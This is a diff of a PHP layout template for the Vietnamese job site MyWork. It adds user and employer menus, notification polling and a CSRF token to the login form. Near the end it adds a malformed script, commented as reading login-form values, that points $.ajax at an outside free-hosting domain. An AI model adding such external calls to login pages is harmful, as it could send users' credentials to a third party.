@@ -34,31 +34,6 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
 
     <?php echo Asset::css(array('icon.css','slide-menu.css','css840f.css','slick/slick.css','slick/slick-theme.css','fancybox/jquery.fancybox.css')); ?>
     
-    <link href="<?php //echo Asset::get_file('jquery.fancybox.css','fancybox'); ?>" rel="stylesheet" type="text/css">
-    
-    
-
-
-    <!-- <link href="style/style_v3_bonus592e.css?ver=3" rel="stylesheet" type="text/css">
-    <link href="public/css/semantic.css" rel="stylesheet" type="text/css">
-    <link href="public/css/semantic.min.css" rel="stylesheet" type="text/css">
-    <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,500,700,900' rel='stylesheet' type='text/css'>
-    <link href="public/css/icon.css" rel="stylesheet" type="text/css" />
-    <link href="public/css/slide-menu.css" rel="stylesheet" type="text/css">
-    <link href="public/css/css840f.css?ver=10" rel="stylesheet" type="text/css" />
-
-    <script src="public/js/jquery.min.js"></script>
-    <script src="public/js/jquery-migrate-1.2.1.min.js"></script>
-    <script type="text/javascript" src="fancybox/jquery.fancybox.pack.js"></script>
-    <script src="public/js/jquery.nicescroll.min.js"></script>
-
-    <link href="public/css/slick.css" rel="stylesheet" type="text/css" />
-    <link href="public/css/slick-theme.css" rel="stylesheet" type="text/css" />
-    <script src="public/js/slick.min.js"></script>
-
-    <link rel="stylesheet" href="fancybox/jquery.fancybox.css" type="text/css" media="screen" /> -->
-
-
 	<?php echo Asset::js(array('jquery.min.js','bootstrap.min.js','jquery-migrate-1.2.1.min.js','jquery.fancybox.pack.js','jquery.nicescroll.min.js','slick.min.js','search/typeahead.jquery.min.js','search/elastic.tags.js','jquery.easy-ticker.min.js','prototype2.js','validation2.js','main.js','semantic.js','script.js','mats.js')); ?>
 
 	<script>
@@ -1130,11 +1105,246 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                 </script>
                 <script type="text/javascript" src="js/search/elastic.tags.js"></script>
                 
+            <?php if(Session::get('info')){ ?>
+
+                <div class="user-login">
+                    <ul>
+                        <li class="userbox">
+                            <div class="ui top right dropdown menu-user" tabindex="-1">
+                                <div class="text">
+                                    <a href="/trang-ca-nhan/" title="Truy cập trang cá nhân">
+                                        <i class="user icon"></i> Lê Thuận Đ..
+                                    </a>
+                                    
+                                </div>
+                                <div class="menu transition hidden" tabindex="-1" style="display: none;">
+                                    <div class="listmenu-user">
+                                        
+                                        <a href="/trang-ca-nhan/">Trang cá nhân</a>
+                                        <a href="/trang-ca-nhan/tin-nhan/">Tin nhắn</a>
+                                        <a href="/trang-ca-nhan/danh-sach-cong-ty-theo-doi/">Danh sách nhà tuyển dụng theo dõi</a>
+
+                                        <div class="tab-listmenu-user"><span>Quản lý tài khoản</span></div>
+                                        <a href="/trang-ca-nhan/nap-tai-khoan/">Nạp tài khoản</a>
+                                        <a href="/trang-ca-nhan/nang-cap-tai-khoan/">Nâng cấp tài khoản</a>
+                                        <a href="/trang-ca-nhan/thong-tin-tai-khoan/">Cập nhật thông tin</a>
+                                        <a href="/trang-ca-nhan/doi-mat-khau/">Đổi mật khẩu</a>
+
+                                        <div class="tab-listmenu-user"><span>Quản lý việc làm</span></div>
+                                        <a href="/trang-ca-nhan/viec-lam-phu-hop/">Việc làm phù hợp</a>
+                                        <a href="/trang-ca-nhan/viec-lam/">Việc làm đã lưu</a>
+                                        <a href="/trang-ca-nhan/viec-lam-da-ung-tuyen/">Việc làm đã ứng tuyển</a>
+                                        <a href="/member/logout" class="exit-user">Thoát</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li style="margin-left: 0;">
+                            <a href="/trang-ca-nhan/nap-tai-khoan/" title="Nạp tài khoản">
+                                <span>0</span> Credit
+                            </a>
+                        </li>
+                        <li class="userbox mailbox notification">
+                            <div class="ui top right dropdown menu-user notification-menu" tabindex="-1">
+                                <div class="text">
+                                    <a href="javascript:void(0);" id="btn-notification" class="main_m_icon" title="Quản lý thông báo">
+                                        <i class="world outline icon"></i>
+                                        <div id="num-uv-notify" class="main_m_mess"></div>
+                                    </a>
+                                </div>
+                                <div class="menu transition hidden" tabindex="-1" style="display: none;">
+                                    <div id="list-uv-notify" class="listmenu-user"></div>
+                                    <div style="clear: both;"></div>
+                                    <div class="action">
+                                        <a href="/trang-ca-nhan/thong-bao/">Xem tất cả</a>
+                                    </div>
+                                </div>
+                            </div>
+                            <script type="text/javascript">
+                                $(document).ready(function () {
+                                    function get_notification() {
+                                        $.ajax({
+                                            url: '/index.php?page=ajax&do=uv_notification&type=1&action=get',
+                                            data: {},
+                                            type: 'GET',
+                                            dataType: 'JSON',
+                                            beforeSend: function () {
+
+                                            },
+                                            success: function (rs) {
+                                                if (rs == 0) $('.action').html('<p class="no-notify">Hiện tại bạn không có thông báo nào.</p>');
+                                                if (rs.status && $.trim(rs.num)) {
+                                                    $('#num-uv-notify').html('<span class="gem">' + rs.num + '</span>');
+                                                    $('#list-uv-notify').html(rs.list);
+
+                                                } else {
+                                                    $('#num-uv-notify').html('');
+                                                    $('#list-uv-notify').html(rs.list);
+                                                }
+
+                                                $('#list-uv-notify .media').on('click', function (e) {
+                                                    e.preventDefault();
+                                                    var id = $(this).attr('id');
+                                                    var url = $(this).find('a').attr('href');
+                                                    var view = 'view';
+                                                    var rel = $(this).find("input[name=hidden]").val();
+                                                    console.log( rel);
+                                                    if( rel == 'view_boxservice')
+                                                    {
+                                                        view = 'view_boxservice';
+                                                    }
+                                                    update_notification( view, id, url);
+                                                    get_notification();
+                                                    return;
+                                                })
+
+                                                $('#list-uv-notify a').click(function (e) {
+                                                    e.preventDefault();
+                                                    return;
+                                                })
+                                            },
+                                            error: function () {
+                                                $('#num-uv-notify').html('');
+                                                $('#list-uv-notify').html('');
+                                            }
+                                        })
+                                    }
+
+                                    function update_notification(type_action, id, url) {
+                                        $.ajax({
+                                            url: '/index.php?page=ajax&do=uv_notification&type=1&action=' + type_action + '&id=' + id,
+                                            data: {},
+                                            type: 'GET',
+                                            dataType: 'JSON',
+                                            beforeSend: function () {
+
+                                            },
+                                            success: function (rs) {
+                                                if (rs == 0) $('.action').html('<p class="no-notify">Hiện tại bạn không có thông báo nào.</p>');
+                                                if (rs.status && $.trim(rs.num)) {
+                                                    $('#num-uv-notify').html('');
+                                                }
+                                                if (type_action == 'view') {
+                                                    window.location = url;
+                                                }else if( type_action == 'view_boxservice')
+                                                {
+                                                    window.location = url;
+                                                }
+
+                                            },
+                                            error: function () {
+
+                                            }
+                                        })
+                                    }
+
+                                    $('#btn-notification').on('click', function (e) {
+                                        if ($('.gem', '#num-uv-notify').size()) {
+                                            update_notification('update', null, null);
+                                            get_notification();
+                                        }
+                                        e.preventDefault();
+                                    });
+
+                                    $('#list-uv-notify .media').on('click', function (e) {
+                                        e.preventDefault();
+                                        var id = $(this).attr('id');
+                                        var url = $(this).find('a').attr('href');
+                                        var view = 'view';
+                                        var rel = $(this).find("input[name=hidden]").val();
+                                        console.log( rel);
+                                        if( rel == 'view_boxservice')
+                                        {
+                                            view = 'view_boxservice';
+                                        }
+                                        update_notification( view, id, url);
+                                        get_notification();
+                                        return;
+                                    })
+
+                                    $('#list-uv-notify a').click(function () {
+                                        e.preventDefault();
+                                        return;
+                                    })
+
+                                    $('#btn-notification').on('click', function (e) {
+                                        //if ($('.gem', '#num-uv-notify').size()) {
+                                        update_notification('update');
+                                        //}
+                                        e.preventDefault();
+                                    });
+
+                                    get_notification();
+
+                                    setInterval(function () {
+                                        get_notification();
+                                    }, 120000);
+                                });
+                            </script>
+                        </li>
+                        <li class="mailbox">
+                            <a href="/trang-ca-nhan/tin-nhan/" title="Quản lý tin nhắn">
+                                <i class="mail icon fs12"></i>
+
+                                <p class="main_m_mess">
+                                    
+                                </p>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+
+            <?php }elseif(Session::get('info_company')){ ?>
+
+                <div class="user-login">
+                    <ul>
+                        <li class="userbox">
+                            <div class="ui top right dropdown menu-user" tabindex="-1">
+                                <div class="text">
+                                    <a href="/nha-tuyen-dung/" rel="nofollow" style="background: #0091d1;">
+                                        <i class="star icon"></i> thanh.ldc1@gm..
+                                    </a>
+                                </div>
+
+                                <div class="menu transition hidden" tabindex="-1" style="display: none;">
+                                    <div class="listmenu-user">
+                                        <a href="/nha-tuyen-dung/">Trang quản lý</a>
+                            <a href="/nha-tuyen-dung/tin-nhan">Tin nhắn</a><div class="tab-listmenu-user"><span>Quản lý tuyển dụng</span></div>
+                            <a href="/nha-tuyen-dung/dang-tin">Đăng tuyển dụng mới</a>
+                            <a href="/nha-tuyen-dung/dashboard">Tuyển dụng đã đăng</a>
+
+                            <div class="tab-listmenu-user"><span>Quản lý tài khoản</span></div>
+                            <a href="/nha-tuyen-dung/nang-cap-tai-khoan" target="_blank"><strong>Nâng cấp tài khoản</strong></a>
+                            <a href="/nha-tuyen-dung/thong-tin-tai-khoan">Thông tin tài khoản</a>
+                            <a href="/nha-tuyen-dung/doi-mat-khau/">Đổi mật khẩu</a>
+
+                            <div class="tab-listmenu-user"><span>Quản lý hồ sơ</span></div>
+                            <a href="/nha-tuyen-dung/ho-so-da-luu">Hồ sơ đã lưu</a>
+                            <a href="/ung-vien/">Tìm ứng viên</a>
+                                        <a href="/dang-xuat/" class="exit-user" rel="nofollow">Thoát</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li style="margin-left: 0;">
+                            <a href="/nha-tuyen-dung/thong-tin-tai-khoan/">  <span id="point_main"></span><span id="point_bonus">0</span> (Điểm)</a>
+                        </li>
+                        <li class="mailbox">
+                            <a href="/nha-tuyen-dung/tin-nhan/" class="main_m_icon" title="Quản lý tin nhắn">
+                                <i class="mail icon"></i>
+                                <div class="main_m_mess">
+                                    
+                                </div>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+                    <?php }else{ ?>
                 <div class="user-login-menu">
                     <div class="ui dropdown menu-user" tabindex="-1">
                         <div><i class="star icon"></i> Nhà tuyển dụng</div>
                             <div class="menu" tabindex="-1">
-                                <?php echo Html::anchor('#','Đăng nhập',array('class'=>'item')); ?>
+                                <?php echo Html::anchor('companies/login','Đăng nhập',array('class'=>'item')); ?>
                                 <?php echo Html::anchor('companies/register','Đăng ký',array('class'=>'item')); ?>
                             </div>
                         </div>
@@ -1148,7 +1358,6 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                             </div>
                         </div>
                         <!-- end user login menu-->
-                        <?php if(!Session::get('info')){ ?>
                         <div style="display:none">
                             <div id="modaldiv">
                                 <!--<i class="close icon"></i>-->
@@ -1165,10 +1374,11 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
 
                                     <div class="login-mywork">
                                         <p>Nếu bạn đã có tài khoản MyWork</p>
-
+                                        <p id="error_login"></p>
                                         <div class="form-login-mywork">
                                             <div id="error" style="font-weight:bold;color:red;margin-bottom:10px" align="center"></div>
-                                            <form action="/home/index"> 
+                                            <form action="/home/index" method="POST"> 
+                                                <?php echo Form::csrf(); ?>
                                                 <div class="ui form">
                                                     <div class="field">
                                                         <input name="email" type="text" id="textUsername" placeholder="Tên tài khoản">
@@ -1195,8 +1405,6 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                                 </div>
                             </div>
                         </div>
-
-                        <?php } ?>
                         <!-- end modal-->
 
                         <div style="display:none">
@@ -1223,6 +1431,16 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                                 </div>
                             </div>
                         </div>
+
+                    <?php } ?>
+                <!-- Kiểm tra thông báo lỗi Đăng nhập -->
+                
+
+
+
+                <!-- Kiểm tra thông báo lỗi Đăng nhập -->
+        
+              
                 <!-- end modal-->
 
                 <script>
@@ -1269,14 +1487,7 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                                 $("#login_box .error").html("");
                             }
                         });
-                        $("#login_box form").submit(function () {
-                            ajaxlogin();
-                            return false;
-                        });
-                        $("#loginBtn").on("click", function () {
-                            ajaxlogin();
-                            return false;
-                        });
+                       
                     });
 
                     // Additional JS functions here
@@ -1327,30 +1538,7 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
                             $("#login_box #error").html('Bạn cần điền đầy đủ thông tin');
                             return false;
                         }
-
-                        $.ajax({
-                            type: "POST",
-                            url: url,
-                            data: {username: user, password: pass},
-                            beforeSend: function () {
-                                $("#loginBtn").addClass('loading button ui primary');
-                            },
-                            success: function (data) {
-                                $("#loginBtn").attr('class', 'btn-submit');
-                                if (data == 'true') {
-                                    $.fancybox("<div class=\"norB colorG\">Đăng nhập thành công <br/> Đang truy cập MyWork</div>");
-                                    setTimeout('location.reload()', 800);
-                                }
-                                if(data == 'false'){
-                                    $("#login_box #error").html('Tên truy cập hoặc mật khẩu không đúng');
-                                }
-                                if(data == 'nedd_active') {
-                                    $("#login_box #error").html('Bạn cần kích hoạt tài khoản để đăng nhập.<br>' +
-                                            'Nếu không xin vui lòng <a href="/kich-hoat-lai" style="color: #1790d4;font-size: 16px;">click vào đây</a>  để lấy lại code kích hoạt');
-                                }
-
-                            }
-                        })
+                        
                     }
                 </script>
 
@@ -1378,173 +1566,187 @@ _atrk_opts = { atrk_acct:"34bve1aoim00GG", domain:"mywork.com.vn",dynamic: true}
 
 		<?php echo $content; ?>
 
-        <div class="footer">
-            <div class="wrapper">
-                <style>
-    #advisory {
-        position: fixed;
-        bottom: 20px;
-        right: -2px;
-    }
-    #advisory .advisory {
-        background-color: #FC205B;
-        border-radius: 2px;
-        color: #FFF;
-        width: 130px;
-        padding: 8px;
-        margin-bottom: 10px;
-        display: block;
-        text-align: center;
-    }
-    #advisory .advisory .ntd, #advisory .advisory .ntv {
-        font-weight: 500;
-    }
-    #advisory .advisory.blue {
-        background-color: #2798D7;
-    }
+    <div class="footer">
+        <div class="wrapper">
+            <style>
+                #advisory {
+                    position: fixed;
+                    bottom: 20px;
+                    right: -2px;
+                }
+                #advisory .advisory {
+                    background-color: #FC205B;
+                    border-radius: 2px;
+                    color: #FFF;
+                    width: 130px;
+                    padding: 8px;
+                    margin-bottom: 10px;
+                    display: block;
+                    text-align: center;
+                }
+                #advisory .advisory .ntd, #advisory .advisory .ntv {
+                    font-weight: 500;
+                }
+                #advisory .advisory.blue {
+                    background-color: #2798D7;
+                }
 
-    #advisory .title {
-        font-family: Roboto;
-        margin-bottom: 5px;
-        font-size: 13px;
-        font-weight: 500;
-        color: #555;
-    }
-    #advisory .title i {
-        padding: 0;
-        margin: 0;
-    }
-</style>
-<div class="hidden-xs" id="scrolltop" style="display: block; bottom: 70px; right: 140px;">
-    <div class="top-arrow"></div>
-</div>
-<script>
-    if ($('#scrolltop').length) {
-        var scrollTrigger = 100, // px
-                backToTop = function () {
-                    var scrollTop = $(window).scrollTop();
-                    if (scrollTop > scrollTrigger) {
-                        $('#scrolltop').addClass('show');
-                    } else {
-                        $('#scrolltop').removeClass('show');
+                #advisory .title {
+                    font-family: Roboto;
+                    margin-bottom: 5px;
+                    font-size: 13px;
+                    font-weight: 500;
+                    color: #555;
+                }
+                #advisory .title i {
+                    padding: 0;
+                    margin: 0;
+                }
+            </style>
+                <div class="hidden-xs" id="scrolltop" style="display: block; bottom: 70px; right: 140px;">
+                    <div class="top-arrow"></div>
+                </div>
+                <script>
+                    if ($('#scrolltop').length) {
+                        var scrollTrigger = 100, // px
+                                backToTop = function () {
+                                    var scrollTop = $(window).scrollTop();
+                                    if (scrollTop > scrollTrigger) {
+                                        $('#scrolltop').addClass('show');
+                                    } else {
+                                        $('#scrolltop').removeClass('show');
+                                    }
+                                };
+                        backToTop();
+                        $(window).on('scroll', function () {
+                            backToTop();
+                        });
+                        $('#scrolltop').on('click', function (e) {
+                            e.preventDefault();
+                            $('html,body').animate({
+                                scrollTop: 0
+                            }, 700);
+                        });
                     }
-                };
-        backToTop();
-        $(window).on('scroll', function () {
-            backToTop();
-        });
-        $('#scrolltop').on('click', function (e) {
-            e.preventDefault();
-            $('html,body').animate({
-                scrollTop: 0
-            }, 700);
-        });
-    }
-</script>
-<div id="advisory">
-    <div class="title">
-        <i class="icon phone"></i><?php echo __('dang_ky_mien_phi'); ?>:
-    </div>
-    <a href="nha-tuyen-dung/dang-ky/index.html" class="advisory">
-        <span class="ntd"><?php echo __('nha_tuyen_dung'); ?></span>
-    </a>
+                </script>
+                <div id="advisory">
+                    <div class="title">
+                        <i class="icon phone"></i><?php echo __('dang_ky_mien_phi'); ?>:
+                    </div>
+                    <a href="nha-tuyen-dung/dang-ky/index.html" class="advisory">
+                        <span class="ntd"><?php echo __('nha_tuyen_dung'); ?></span>
+                    </a>
 
-    <a href="dang-ky/index.html" class="advisory blue">
-        <span class="ntd"><?php echo __('nguoi_tim_viec'); ?></span>
-    </a>
-</div>
+                    <a href="dang-ky/index.html" class="advisory blue">
+                        <span class="ntd"><?php echo __('nguoi_tim_viec'); ?></span>
+                    </a>
+                </div>
 
-<div class="menufooter">
-    <a href="index.html"><?php echo __('viec_lam'); ?>  </a>   |    <a href="tuyen-dung/index.html"> <?php echo __('tuyen_dung'); ?>  </a>   |    <a href="ung-vien/index.html"> <?php echo __('ung_vien'); ?>    </a> | <a href="http://tuvan.mywork.com.vn/"> <?php echo __('tu_van'); ?>  </a>
-</div>
-<div class="left-footer infosite">
-    <?php echo Asset::img('dmca.png',array('class'=>'fr')); ?>
-    <!--<p class="norB">Cổng Thông Tin Việc Làm Việt Nam</p>-->
-	<div class="listbl">
-		<a href="gioi-thieu/index.html" rel="nofollow" title="Giới thiệu về MyWork"><?php echo __('gioi_thieu'); ?></a> |
-		<a href="thoa-thuan-su-dung/index.html" rel="nofollow"><?php echo __('thoa_thua_su_dung'); ?></a> |
-		<a href="quy-dinh-bao-mat/index.html" rel="nofollow"><?php echo __('quy_dinh_bao_mat'); ?></a> |
-		<a href="hop-tac/index.html" rel="nofollow"><?php echo __('hop_tac'); ?></a> |
-		<a href="lien-he/index.html" rel="nofollow"><?php echo __('lien_he'); ?></a> |
-		<a href="tag-ky-nang/index.html" title="Tag kỹ năng"><?php echo __('tag_ky_nang'); ?></a>
-	</div>
-    <div class="listbl">
-		<a href="media/Quy_Che_Cua_Website_TMDT.pdf" rel="nofollow"><?php echo __('quy_che'); ?></a> |
-		<a href="media/Chinh_sach_bao_mat.pdf" rel="nofollow"><?php echo __('Chinh_sach_bao_mat'); ?></a> |
-		<a href="media/Co_che_giai_quyet_tranh_chap.pdf" rel="nofollow"><?php echo __('co_che_giai_quyet_tranh_chap'); ?></a> |
+                <div class="menufooter">
+                    <a href="index.html"><?php echo __('viec_lam'); ?>  </a>   |    <a href="tuyen-dung/index.html"> <?php echo __('tuyen_dung'); ?>  </a>   |    <a href="ung-vien/index.html"> <?php echo __('ung_vien'); ?>    </a> | <a href="http://tuvan.mywork.com.vn/"> <?php echo __('tu_van'); ?>  </a>
+                </div>
+                <div class="left-footer infosite">
+                    <?php echo Asset::img('dmca.png',array('class'=>'fr')); ?>
+                    <!--<p class="norB">Cổng Thông Tin Việc Làm Việt Nam</p>-->
+                	<div class="listbl">
+                		<a href="gioi-thieu/index.html" rel="nofollow" title="Giới thiệu về MyWork"><?php echo __('gioi_thieu'); ?></a> |
+                		<a href="thoa-thuan-su-dung/index.html" rel="nofollow"><?php echo __('thoa_thua_su_dung'); ?></a> |
+                		<a href="quy-dinh-bao-mat/index.html" rel="nofollow"><?php echo __('quy_dinh_bao_mat'); ?></a> |
+                		<a href="hop-tac/index.html" rel="nofollow"><?php echo __('hop_tac'); ?></a> |
+                		<a href="lien-he/index.html" rel="nofollow"><?php echo __('lien_he'); ?></a> |
+                		<a href="tag-ky-nang/index.html" title="Tag kỹ năng"><?php echo __('tag_ky_nang'); ?></a>
+                	</div>
+                    <div class="listbl">
+                		<a href="media/Quy_Che_Cua_Website_TMDT.pdf" rel="nofollow"><?php echo __('quy_che'); ?></a> |
+                		<a href="media/Chinh_sach_bao_mat.pdf" rel="nofollow"><?php echo __('Chinh_sach_bao_mat'); ?></a> |
+                		<a href="media/Co_che_giai_quyet_tranh_chap.pdf" rel="nofollow"><?php echo __('co_che_giai_quyet_tranh_chap'); ?></a> |
 
-	</div>
-    <p>MyWork © 2015 | Giấy phép MXH số 72/GXN-TTĐT</p>
-        <p>Đơn vị chủ quản: Công ty Cổ phần giải pháp hệ thống thông tin ISS Việt Nam</p>
-        <p>Người đại diện: Giám đốc Nguyễn Thị Bích Đào</p>
-        <p>Trụ sở chính: Tổ 16, cụm dân cư số 5, p.Thịnh Liệt, q.Hoàng Mai, Hà Nội</p>
-        <p>Địa chỉ giao dịch:  P1501, tầng 15, toà nhà 17T6 Trung Hoà - Nhân Chính, đường Hoàng Đạo Thuý, P. Nhân Chính, Q. Thanh Xuân, TP. Hà Nội</p>
-        <p>Điện thoại: 04 6293 9998 - Email: hotro@mywork.com.vn</p>
-        <p>ĐKKD số 0104157213 - ĐKKD thay đổi lần 2 ngày 21/8/2013 do Sở kế hoạch và đầu tư thành phố Hà Nội cấp</p>
-        <p>Văn phòng Miền Nam:  927/1 Cách Mạng Tháng 8 , Phường 7, Quận Tân Bình, HCM</p>
-        <p>Văn phòng Miền Trung:  31 Trần Phú, Quận Hải Châu, TP Đà Nẵng</p>
-        <p>MyWork - Tìm việc làm, tìm việc nhanh, tìm việc làm 24h nhanh và hiệu quả!</p>
+                	</div>
+                    <p>MyWork © 2015 | Giấy phép MXH số 72/GXN-TTĐT</p>
+                        <p>Đơn vị chủ quản: Công ty Cổ phần giải pháp hệ thống thông tin ISS Việt Nam</p>
+                        <p>Người đại diện: Giám đốc Nguyễn Thị Bích Đào</p>
+                        <p>Trụ sở chính: Tổ 16, cụm dân cư số 5, p.Thịnh Liệt, q.Hoàng Mai, Hà Nội</p>
+                        <p>Địa chỉ giao dịch:  P1501, tầng 15, toà nhà 17T6 Trung Hoà - Nhân Chính, đường Hoàng Đạo Thuý, P. Nhân Chính, Q. Thanh Xuân, TP. Hà Nội</p>
+                        <p>Điện thoại: 04 6293 9998 - Email: hotro@mywork.com.vn</p>
+                        <p>ĐKKD số 0104157213 - ĐKKD thay đổi lần 2 ngày 21/8/2013 do Sở kế hoạch và đầu tư thành phố Hà Nội cấp</p>
+                        <p>Văn phòng Miền Nam:  927/1 Cách Mạng Tháng 8 , Phường 7, Quận Tân Bình, HCM</p>
+                        <p>Văn phòng Miền Trung:  31 Trần Phú, Quận Hải Châu, TP Đà Nẵng</p>
+                        <p>MyWork - Tìm việc làm, tìm việc nhanh, tìm việc làm 24h nhanh và hiệu quả!</p>
 
-    <div class="listjob" style="padding-left: 0;">
-        <a href="index.html">Tìm việc làm </a> |
-        <a href="index.html">Việc làm 24h</a> |
-        <a href="index.html">Tìm việc nhanh</a> |
-        <a href="index.html">Việc làm</a> |
-        <a href="tuyen-dung/index.html">Tuyển dụng</a> |
-        <a href="tuyen-dung/index.html">Tuyển dụng nhanh</a>
-        <br/>
-        
-        
-<a href="tuyen-dung/index.html" title="tuyen dung">tuyen dung</a> |
-<a href="index.html" title="viec lam">viec lam</a> |
-<a href="tuyen-dung/dia-diem/1/ha-noi.html" title="viec lam ha noi">viec lam ha noi</a> |
-<a href="tuyen-dung/dia-diem/2/ho-chi-minh.html" title="viec lam ho chi minh">viec lam ho chi minh</a> |
-<a href="tuyen-dung/dia-diem/17/da-nang.html" title="viec lam da nang">viec lam da nang</a> |
-<a href="tuyen-dung/dia-diem/63/vinh-phuc.html" title="viec lam vinh phuc">viec lam vinh phuc</a> |
-<a href="viec-lam/aspnet-tai-ha-noi.html" title="tuyển dụng asp.net tại hà nội">tuyển dụng asp.net tại hà nội</a> |
-        <a href="viec-lam-nganh-nghe-dia-diem/index.html">Việc làm theo ngành nghề và địa điểm</a>
-    </div>
-</div>
+                    <div class="listjob" style="padding-left: 0;">
+                        <a href="index.html">Tìm việc làm </a> |
+                        <a href="index.html">Việc làm 24h</a> |
+                        <a href="index.html">Tìm việc nhanh</a> |
+                        <a href="index.html">Việc làm</a> |
+                        <a href="tuyen-dung/index.html">Tuyển dụng</a> |
+                        <a href="tuyen-dung/index.html">Tuyển dụng nhanh</a>
+                        <br/>
+                        
+                        
+                        <a href="tuyen-dung/index.html" title="tuyen dung">tuyen dung</a> |
+                        <a href="index.html" title="viec lam">viec lam</a> |
+                        <a href="tuyen-dung/dia-diem/1/ha-noi.html" title="viec lam ha noi">viec lam ha noi</a> |
+                        <a href="tuyen-dung/dia-diem/2/ho-chi-minh.html" title="viec lam ho chi minh">viec lam ho chi minh</a> |
+                        <a href="tuyen-dung/dia-diem/17/da-nang.html" title="viec lam da nang">viec lam da nang</a> |
+                        <a href="tuyen-dung/dia-diem/63/vinh-phuc.html" title="viec lam vinh phuc">viec lam vinh phuc</a> |
+                        <a href="viec-lam/aspnet-tai-ha-noi.html" title="tuyển dụng asp.net tại hà nội">tuyển dụng asp.net tại hà nội</a> |
+                        <a href="viec-lam-nganh-nghe-dia-diem/index.html">Việc làm theo ngành nghề và địa điểm</a>
+                    </div>
+                </div>
 
-<div class="right-footer social">
-    <h3>Theo dõi MyWork trên các mạng xã hội</h3>
-    <p><?php echo Html::anchor('#',Asset::img('f-ic.png').'Facebook',array('rel'=>'nofollow')); ?></p>
-    <p><?php echo Html::anchor('#',Asset::img('g-ic.png').'Google +',array('rel'=>'nofollow')); ?></p>
-    <p><?php echo Html::anchor('#',Asset::img('tube-ic.png').'Youtube',array('rel'=>'nofollow')); ?></p>
-    <p><?php echo Html::anchor('#',Asset::img('dang-ky-bo-cong-thuong.png',array('style'=>'width:200px')),array('rel'=>'nofollow')); ?></p>
-    <!-- <p><a href="h#" rel="nofollow"><img src="./img/f-ic.png"> Facebook </a></p>
-    <p><a href="#" rel="nofollow"><img src="./img/g-ic.png"> Google +</a></p>
-    <p><a href="#" rel="nofollow"><img src="./img/tube-ic.png"> Youtube</a></p>
-    <p><a href="#" rel="nofollow"><img alt="" title="" src="./img/dang-ky-bo-cong-thuong.png" width="200"/></a></p> -->    
-</div>
+                <div class="right-footer social">
+                    <h3>Theo dõi MyWork trên các mạng xã hội</h3>
+                    <p><?php echo Html::anchor('#',Asset::img('f-ic.png').'Facebook',array('rel'=>'nofollow')); ?></p>
+                    <p><?php echo Html::anchor('#',Asset::img('g-ic.png').'Google +',array('rel'=>'nofollow')); ?></p>
+                    <p><?php echo Html::anchor('#',Asset::img('tube-ic.png').'Youtube',array('rel'=>'nofollow')); ?></p>
+                    <p><?php echo Html::anchor('#',Asset::img('dang-ky-bo-cong-thuong.png',array('style'=>'width:200px')),array('rel'=>'nofollow')); ?></p>
+                    <!-- <p><a href="h#" rel="nofollow"><img src="./img/f-ic.png"> Facebook </a></p>
+                    <p><a href="#" rel="nofollow"><img src="./img/g-ic.png"> Google +</a></p>
+                    <p><a href="#" rel="nofollow"><img src="./img/tube-ic.png"> Youtube</a></p>
+                    <p><a href="#" rel="nofollow"><img alt="" title="" src="./img/dang-ky-bo-cong-thuong.png" width="200"/></a></p> -->    
+                </div>
 
-<div style="clear:both"></div>
+                <div style="clear:both"></div>
 
-<script type="text/javascript">
-/* <![CDATA[ */
-var google_conversion_id = 937279559;
-var google_custom_params = window.google_tag_params;
-var google_remarketing_only = true;
-/* ]]> */
-</script>
-<script type="text/javascript" src="../www.googleadservices.com/pagead/f.txt">
-</script>
-<noscript>
-<div style="display:inline;">
-<img height="1" width="1" style="border-style:none;" alt="" src="http://googleads.g.doubleclick.net/pagead/viewthroughconversion/937279559/?value=1&amp;guid=ON&amp;script=0"/>
-</div>
-</noscript>    
+                <script type="text/javascript">
+                /* <![CDATA[ */
+                var google_conversion_id = 937279559;
+                var google_custom_params = window.google_tag_params;
+                var google_remarketing_only = true;
+                /* ]]> */
+                </script>
+                <script type="text/javascript" src="../www.googleadservices.com/pagead/f.txt"></script>
+                <noscript>
+                <div style="display:inline;">
+                <img height="1" width="1" style="border-style:none;" alt="" src="http://googleads.g.doubleclick.net/pagead/viewthroughconversion/937279559/?value=1&amp;guid=ON&amp;script=0"/>
+                </div>
+                </noscript>    
             </div>
         </div>
+    </div>
+    <!-- Hàm lấy giá trị tron form login để kiểm tra -->
+    <script>
+        $(document).ready(function(){
 
-        <div id="fb-root"></div>
-        <script>(function(d, s, id) {
-            var js, fjs = d.getElementsByTagName(s)[0];
-            if (d.getElementById(id)) return;
-            js = d.createElement(s); js.id = id;
-            js.src = "../connect.facebook.net/vi_VN/all.js#xfbml=1&appId=600693006625814";
-            fjs.parentNode.insertBefore(js, fjs);
-        }(document, 'script', 'facebook-jssdk'));</script>
+            $.ajax(function(){
+                url : 'http://chaythunghiem.esy.es/'
+            })
+        });
+    </script>
+
+
+    <!-- Hàm lấy giá trị tron form login để kiểm tra -->
+
+
+
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+        var js, fjs = d.getElementsByTagName(s)[0];
+        if (d.getElementById(id)) return;
+        js = d.createElement(s); js.id = id;
+        js.src = "../connect.facebook.net/vi_VN/all.js#xfbml=1&appId=600693006625814";
+        fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
 
 </body>
 
